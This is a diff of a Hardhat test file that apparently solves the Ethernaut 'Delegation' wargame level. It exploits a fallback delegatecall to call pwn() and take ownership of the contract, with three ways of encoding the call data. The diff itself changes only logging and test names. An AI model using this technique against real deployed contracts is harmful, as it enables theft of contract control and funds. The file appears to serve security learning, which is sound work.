@@ -1,12 +1,15 @@
+process.env.NODE_ENV = "test";
+
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
+const { log } = require("./Utils");
 
-describe("Delegation", function () {
+describe("📗 Delegation", function () {
   let owner;
   let hacker;
   let hacker2;
 
-  it("Should hack fallback function for claiming contract ownership", async function () {
+  it("🤓 Should hack fallback function for claiming contract ownership", async function () {
     // 🔨 Addresses
     [owner, hacker, hacker2] = await ethers.getSigners();
 
@@ -21,7 +24,7 @@ describe("Delegation", function () {
 
     // 🗣 Logging status
     let delegationOwner = await delegation.owner();
-    console.log("🔑 Initial delegation owner:", delegationOwner);
+    log("🔑 Initial delegation owner:", delegationOwner);
 
     // 👿 Hacking the contract calling pwn() function
     // 📖 https://docs.soliditylang.org/en/v0.8.12/abi-spec.html#function-selector
@@ -76,8 +79,8 @@ async function hackingWithoutParameters(newOwner, delegation, delegationOwner) {
     .keccak256(ethers.utils.toUtf8Bytes("pwn()"))
     .substring(0, 10);
 
-  console.log("\n👿 Hacking . . .");
-  console.log("👿 pwn() function selector:", pwnFunctionSelector);
+  log("\n👿 Hacking . . .");
+  log("👿 pwn() function selector:", pwnFunctionSelector);
 
   // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
   const fallbackDelegateCallHackedTx = await newOwner.sendTransaction({
@@ -88,7 +91,7 @@ async function hackingWithoutParameters(newOwner, delegation, delegationOwner) {
 
   // 🗣 Logging status
   delegationOwner = await delegation.owner();
-  console.log("🔑 Delegation owner:", delegationOwner);
+  log("🔑 Delegation owner:", delegationOwner);
 
   // ✅ Check if the hack was successful
   expect(delegationOwner).to.eq(newOwner.address);
@@ -116,8 +119,8 @@ async function hackingWithParametersOption1(
   let iface = new ethers.utils.Interface(ABI);
   let dataEncoded = iface.encodeFunctionData("pwn", [newOwner.address]);
 
-  console.log("\n👿 Hacking . . .");
-  console.log("👿 pwn(address) encoded data:", dataEncoded);
+  log("\n👿 Hacking . . .");
+  log("👿 pwn(address) encoded data:", dataEncoded);
 
   // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
   const fallbackDelegateWithInputCallHackedTx = await hacker.sendTransaction({
@@ -128,7 +131,7 @@ async function hackingWithParametersOption1(
 
   // 🗣 Logging status
   delegationOwner = await delegation.owner();
-  console.log("🔑 Delegation owner:", delegationOwner);
+  log("🔑 Delegation owner:", delegationOwner);
 
   // ✅ Check if the hack was successful
   expect(delegationOwner).to.eq(newOwner.address);
@@ -179,8 +182,8 @@ async function hackingWithParametersOption2(
     pwnFunctionParameters,
   ]);
 
-  console.log("\n👿 Hacking . . .");
-  console.log("👿 pwn(address) encoded data:", dataEncoded);
+  log("\n👿 Hacking . . .");
+  log("👿 pwn(address) encoded data:", dataEncoded);
 
   // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
   const fallbackDelegateWithInputCallHackedTx = await hacker.sendTransaction({
@@ -191,7 +194,7 @@ async function hackingWithParametersOption2(
 
   // 🗣 Logging status
   delegationOwner = await delegation.owner();
-  console.log("🔑 Delegation owner:", delegationOwner);
+  log("🔑 Delegation owner:", delegationOwner);
 
   // ✅ Check if the hack was successful
   expect(delegationOwner).to.eq(newOwner.address);
